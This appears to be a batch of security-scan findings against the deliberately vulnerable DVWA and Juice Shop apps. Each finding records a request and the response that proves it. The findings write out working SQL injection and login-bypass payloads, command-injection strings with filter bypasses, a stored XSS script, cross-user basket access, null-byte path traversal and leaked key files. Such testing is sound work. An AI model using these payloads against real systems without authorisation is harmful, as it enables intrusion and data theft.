findings.title: SQL Injection in DVWA SQLi page via unsanitized 'id' parameter [security=low]
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned 5 records: admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith (confirmed surnames: Brown, Me, Picasso, Smith, admin). FALSE payload id=1' AND '1'='2 returned zero records ('User ID:' with no First name/Surname output). This confirms the id parameter is concatenated unsanitized into the backend SQL query, allowing boolean-based SQL injection.

findings.title: OS Command Injection in DVWA Ping page via unsanitized 'ip' parameter [security=low]
findings.response_evidence: [security=low] Payload ip=127.0.0.1; whoami was submitted. Response contained full ping output followed immediately by the literal string 'www-data' on its own line (the output of the injected whoami command appended after the ping statistics block), confirming that the shell executed the chained command as the www-data web-server process identity. Raw pre-block: 'PING 127.0.0.1 ... rtt min/avg/max/mdev = 0.032/0.041/0.047/0.005 ms\nwww-data'.

findings.title: Stored XSS in DVWA Guestbook (xss_s) via unsanitized 'mtxMessage' field [security=low]
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ form_data={txtName: 'tester', mtxMessage: '<script id="test_token">window.xss_flag=1</script>', btnSign: 'Sign Guestbook'} (session=dvwa_admin)
findings.response_evidence: [security=low] Canary payload <script id="test_token">window.xss_flag=1</script> (50 chars, fits mtxMessage maxlength=50) was stored and reflected unescaped on page render. Upon loading /vulnerabilities/xss_s/ in an authenticated browser context, the injected script executed.
findings.browser_js_evidence: browser_eval_js("window.xss_flag") returned result: 1. browser_read_dom("#test_token") returned inner_html_excerpt: "window.xss_flag=1", confirming the injected <script id="test_token"> element was stored in the DOM and executed, setting the global flag.

findings.title: SQL Injection via numeric boolean payload in id parameter (DVWA medium security)
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> confirmed 'Security Level: medium' in footer and 'Security level is currently: medium.' text
findings.response_evidence: [security=medium] TRUE payload 'id=1 OR 1=1' returned 5 seeded user records: (admin/admin), (Gordon/Brown), (Hack/Me), (Pablo/Picasso), (Bob/Smith) — exact surnames: admin, Brown, Me, Picasso, Smith. FALSE payload 'id=1 AND 1=2' returned zero records (visible_text shows only the dropdown/User ID selector, no 'ID:'/'First name:'/'Surname:' pre_blocks at all). This confirms the id POST parameter is concatenated unsanitized into the SQL query at medium security (quotes are escaped server-side via mysqli_real_escape_string, but numeric/unquoted boolean injection bypasses this), satisfying the TRUE-multiple-rows vs FALSE-zero-rows behavioral criterion for SQLi.

findings.title: OS Command Injection via pipe payload in ip parameter (DVWA medium security)
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> confirmed 'Security Level: medium' in footer
findings.response_evidence: [security=medium] Payload 'ip=127.0.0.1| whoami' bypassed the medium blacklist (which filters literal ';' and '&&' substrings via str_replace but not a bare pipe '|') and the response pre_blocks contained exactly: 'www-data' — the web server process identity — appended after the ping output area, confirming arbitrary command execution on the host via the ip parameter at medium security.

findings.title: OS Command Injection via pipe (no trailing space) bypasses DVWA high-security blacklist
findings.response_evidence: [security=high] Response page rendered inside <pre> block: 'www-data' appended directly after the ping output area (pre_blocks: [\"www-data\"]), confirming the pipe character with no trailing space (127.0.0.1|whoami) bypassed the high-security blacklist (which strips '; ', '| ', and '&&') and executed the whoami command, returning the web server process identity www-data.

findings.title: SQL Injection via session-input two-step flow at DVWA high security (comment-terminated payload bypasses appended LIMIT 1)
request_sequence: TRUE CASE: POST /vulnerabilities/sqli/session-input.php body: id=1' OR '1'='1' #&Submit=Submit
FALSE CASE: POST /vulnerabilities/sqli/session-input.php body: id=1' AND '1'='2' #&Submit=Submit
findings.response_evidence: [security=high] TRUE case (id=1' OR '1'='1' #) caused GET /vulnerabilities/sqli/ to return 5 full records: Surnames admin, Brown, Me, Picasso, Smith (First names admin, Gordon, Hack, Pablo, Bob) - exact pre_blocks: [\"ID: 1' OR '1'='1' #\\nFirst name: admin\\nSurname: admin\", \"...Gordon...Brown\", \"...Hack...Me\", \"...Pablo...Picasso\", \"...Bob...Smith\"]. FALSE case (id=1' AND '1'='2' #) caused GET /vulnerabilities/sqli/ to return zero records (visible_text/forms contain no ID/First name/Surname rows, only the 'Click here to change your ID' link). This confirms the out-of-band session-stored id is concatenated unsanitized into the SQL query (with LIMIT 1 requiring the trailing '#' comment to avoid syntax errors), satisfying the TRUE-multiple-rows vs FALSE-zero-rows criterion at high security.

findings.title: Stored XSS in guestbook message field persists unfiltered at DVWA high security
request_sequence: GET /vulnerabilities/xss_s/ -> form fields txtName(maxlength=10), mtxMessage(maxlength=50), btnSign
findings.response_evidence: [security=high] Despite being at high security level (footer confirms 'Security Level: high'), the mtxMessage field is not sanitized (only txtName undergoes strip_tags in DVWA's xss_s source across all levels); the raw canary script tag was stored and rendered unescaped in the guestbook listing. Loading the page in an authenticated browser context and evaluating window.xss_flag returned 1, proving the injected <script> executed.

findings.title: Cross-User Basket Access (BOLA) via /rest/basket/{id}
request_sequence: GET /rest/basket/6 as juiceshop_acct1 (own basket) -> 200, UserId:22, Products:[{id:1,name:'Apple Juice (1000ml)',BasketItem:{quantity:3,BasketId:6}}]

GET /rest/basket/6 as juiceshop_acct2 (acct2 own_basket_id=7, requesting acct1's basket id=6) -> 200, returns identical data: UserId:22, Products:[{id:1,name:'Apple Juice (1000ml)',BasketItem:{quantity:3,BasketId:6}}]
findings.response_evidence: acct1's own basket (id=6) contains a distinct seeded item: Apple Juice (1000ml), quantity=3, UserId=22. When authenticated as juiceshop_acct2 (whose own_basket_id is 7, a different user, UserId presumably 23), issuing GET /rest/basket/6 succeeded with HTTP 200 and returned acct1's exact basket contents (UserId:22, Apple Juice (1000ml) qty:3, BasketId:6) without any authorization error. This proves the API does not enforce basket ownership checks on the authenticated session token vs. the requested basket id, allowing full cross-user basket disclosure (BOLA/CWE-639).

findings.title: Authentication Bypass via SQL Injection on Login
findings.response_evidence: Submitting email=' OR 1=1-- with an arbitrary password bypasses the login query's intended WHERE email=... AND password=[REDACTED] logic (the injected OR 1=1-- comments out the password check and matches the first row of the Users table). The server responded HTTP 200 with a valid authentication object containing a JWT token and umail:\"admin@juice-sh.op\" — i.e., the application authenticated the attacker as the admin user without knowing the admin's actual password, confirming SQLi-based authentication bypass (CWE-89).

findings.title: SQL Injection in Product Search (Error-based + UNION-based)
request_sequence: GET /rest/products/search?q=qwert%27 session=unauth -> 500, body: Error: SQLITE_ERROR: near "'%'": syntax error
findings.response_evidence: 1) A single unescaped quote in q=qwert' caused an unhandled database error reflected to the client: HTTP 500 with body 'Error: SQLITE_ERROR: near \"'%'\": syntax error', proving the q parameter is concatenated directly into a raw SQL query without sanitization. 2) A crafted UNION payload q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- closed the original query's parentheses/LIKE clause and successfully appended a 9-column UNION SELECT, returning HTTP 200 with a crafted result row where every field literally equals the injected column index (name:2, description:3, price:4, etc.) — this is only possible if the injected SQL was executed verbatim by the database, confirming exploitable SQL injection (CWE-89) with demonstrated data extraction capability.

findings.title: Open Directory Listing on /ftp/ exposing confidential acquisition memo
findings.response_evidence:
1) GET /ftp/ returned HTTP 200 with a serve-index directory listing (visible_text): 'listing directory /ftp/ ~ / ftp / quarantine ... acquisitions.md 909 ... announcement_encrypted.md ... coupons_2013.md.bak ... legal.md ... package.json.bak ... suspicious_errors.yml' - confirming an open, browsable directory exposing internal files including acquisitions.md.
2) GET /ftp/acquisitions.md returned HTTP 200 (content-type text/markdown) with body: '# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year. This will have a significant stock market impact as we will elaborate in detail in the following paragraph: ... Our shareholders will be excited. It's true. No fake news.' This is the verbatim confidential acquisition memo text, proving the open directory listing discloses sensitive internal documents without authentication.

findings.title: Unauthenticated access to /api/Feedbacks discloses user PII (emails) and UserId mappings
request_sequence: GET http://juiceshop:3000/api/Feedbacks (no Authorization header, no session cookie)
findings.response_evidence: Unauthenticated (session=unauth, no auth headers/cookies sent) GET /api/Feedbacks returned HTTP 200 with JSON body: {\"status\":\"success\",\"data\":[{\"UserId\":1,\"id\":1,\"comment\":\"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)\",...},{\"UserId\":2,...,\"comment\":\"... (***@juice-sh.op)\"},{\"UserId\":3,...,\"comment\":\"... (***der@juice-sh.op)\"},{\"UserId\":21,...,\"comment\":\"Please send me the juicy chatbot NFT ... wallet seed phrase ... (***ereum@juice-sh.op)\"}, ...]}. The response discloses internal numeric UserId values linked to feedback records plus partially-masked but recognizable author email addresses (PII) for registered users, all without any authentication — confirming unauthenticated PII exposure.

findings.title: Poison null-byte path traversal bypasses .bak file extension filter under /ftp/
findings.response_evidence:
1) Direct GET /ftp/package.json.bak returned HTTP 403 with body: 'Error: Only .md and .pdf files are allowed! ... at verify (/juice-shop/build/routes/fileServer.js:55:18)' confirming the extension allow-list filter blocks direct .bak access.
2) GET /ftp/package.json.bak%2500.md (URL-encoded null byte + allowed .md extension appended) returned HTTP 200 (content-type application/octet-stream) with the actual restricted file content: '{
  "name": "juice-shop",
  "version": "6.2.0-SNAPSHOT",
  "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {...}, "devDependencies": {...} }' — the full package.json content, proving the null-byte terminator in the filename bypasses the extension filter and serves the restricted .bak backup file despite the filter rejecting it directly.

findings.title: Exposed Encryption-Keys Directory Listing at /encryptionkeys/
findings.response_evidence:
1) GET /encryptionkeys/ returned HTTP 200 with a browsable directory listing (content_type text/html). Rendered listing text: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM', with direct links to jwt.pub and premium.key.
2) GET /encryptionkeys/premium.key returned HTTP 200, content_type application/octet-stream, body: '1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42' — the premium feature unlock key, retrievable with zero authentication.
3) GET /encryptionkeys/jwt.pub returned HTTP 200, content_type application/x-mspublisher, body: '-----BEGIN RSA PUBLIC KEY-----\nMIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE=\n-----END RSA PUBLIC KEY-----' — the JWT signing public key, also retrievable without authentication. This confirms both the directory browsability and the sensitive key file exposure criteria.
